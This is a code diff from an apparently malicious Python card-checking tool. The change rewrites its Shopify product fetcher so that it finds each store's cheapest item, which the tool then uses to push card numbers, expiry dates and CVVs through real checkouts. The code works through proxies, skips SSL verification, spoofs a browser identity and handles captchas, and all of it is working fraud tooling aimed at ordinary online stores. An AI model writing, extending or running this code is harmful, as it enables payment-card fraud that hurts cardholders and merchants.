@@ -307,41 +307,66 @@ def extract_clean_response(message):
         return words[0]
     return message[:50]
 
-# ==================== PRODUCT FETCHING ====================
-def fetch_cheapest_product_sync(site_url, proxy=None):
-    """Synchronous product fetcher – finds cheapest available variant."""
+# ==================== ORIGINAL ASYNC PRODUCT FETCH ====================
+async def fetch_products(domain, proxy_str=None):
     try:
-        if not site_url.startswith('http'):
-            site_url = 'https://' + site_url
-        session = requests.Session()
-        session.verify = False
-        if proxy:
-            proxy_dict = {'http': proxy, 'https': proxy}
-            session.proxies = proxy_dict
-        resp = session.get(f"{site_url}/products.json?limit=50", timeout=10)
-        if resp.status_code != 200:
-            return None
-        data = resp.json()
+        if not domain.startswith('http'):
+            domain = "https://" + domain
+        
+        connector = aiohttp.TCPConnector(ssl=False)
+        timeout = aiohttp.ClientTimeout(total=10)
+        proxy = parse_proxy(proxy_str) if proxy_str else None
+        
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
+                if resp.status != 200:
+                    return False, f"<b>Site Error! Status: {resp.status}</b>"
+                text = await resp.text()
+                if "shopify" not in text.lower():
+                    return False, "<b>Not Shopify!</b>"
+
+                result = (await resp.json())['products']
+                if not result:
+                    return False, "<b>No Products!</b>"
+
         min_price = float('inf')
-        min_variant = None
-        for product in data.get('products', []):
-            for variant in product.get('variants', []):
+        min_product = None
+
+        for product in result:
+            if not product.get('variants'):
+                continue
+            
+            for variant in product['variants']:
                 if not variant.get('available', True):
                     continue
+                
                 try:
-                    price = float(variant['price'])
-                    if price < min_price and price > 0:
+                    price = variant.get('price', '0')
+                    if isinstance(price, str):
+                        price = float(price.replace(',', ''))
+                    else:
+                        price = float(price)
+
+                    if price < min_price:
                         min_price = price
-                        min_variant = {
-                            'variant_id': variant['id'],
+                        min_product = {
+                            'site': domain,
                             'price': f"{price:.2f}",
-                            'product_title': product.get('title', '')
+                            'variant_id': str(variant['id']),
+                            'link': f"{domain}/products/{product['handle']}"
                         }
-                except:
+                except (ValueError, TypeError, AttributeError):
                     continue
-        return min_variant
-    except Exception:
-        return None
+        
+        if isinstance(min_product, dict) and min_product.get('variant_id'):
+            return min_product
+        else:
+            return False, "<b>No Valid Products</b>"
+
+    except aiohttp.ClientError as e:
+        return False, f"<b>Proxy Error: {str(e)}</b>"
+    except Exception as e:
+        return False, f"error: {str(e)}"
 
 # ==================== ASYNC CARD PROCESSING ====================
 async def make_graphql_request_with_captcha_handling(session, url, params, headers, json_data, checkout_url, max_retries=1):
@@ -366,17 +391,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     running_total = "0.00"
 
     try:
-        # 1. Get cheapest product if variant not provided
+        # Get cheapest product if variant not provided
         if not variant_id:
-            product_info = await asyncio.to_thread(fetch_cheapest_product_sync, ourl, proxy_str)
-            if not product_info:
-                return False, "No product found", gateway, total_price, currency
-            variant_id = product_info['variant_id']
-            subtotal = product_info['price']
+            info = await fetch_products(ourl, proxy_str)
+            if isinstance(info, tuple) and info[0] is False:
+                return False, info[1], gateway, total_price, currency
+            variant_id = info['variant_id']
+            subtotal = info['price']
         else:
             subtotal = "0.01"
 
-        # 2. Add to cart and get checkout page
+        # Add to cart and get checkout page
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/plain, */*',
@@ -911,24 +936,12 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
         if len(year) == 2:
             year = f"20{year}"
 
-        # Get cheapest product to get variant_id
-        product_info = fetch_cheapest_product_sync(site_url, proxy)
-        if not product_info:
-            return {
-                'Response': 'No product found',
-                'status': 'ERROR',
-                'gateway': 'Shopify Payments',
-                'price': '0.00',
-                'site': site_url
-            }
-        variant_id = product_info['variant_id']
-        price = product_info['price']
-
+        # Note: product fetch is now inside process_card, no need to fetch here.
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         try:
             success, message, gateway, total_price, currency = loop.run_until_complete(
-                process_card(card_number, month, year, cvv, site_url, variant_id, proxy)
+                process_card(card_number, month, year, cvv, site_url, None, proxy)
             )
         finally:
             loop.close()
@@ -946,7 +959,7 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
             'Response': message,
             'status': status,
             'gateway': gateway,
-            'price': total_price if total_price != "0.00" else price,
+            'price': total_price,
             'site': site_url,
             'message': message
         }
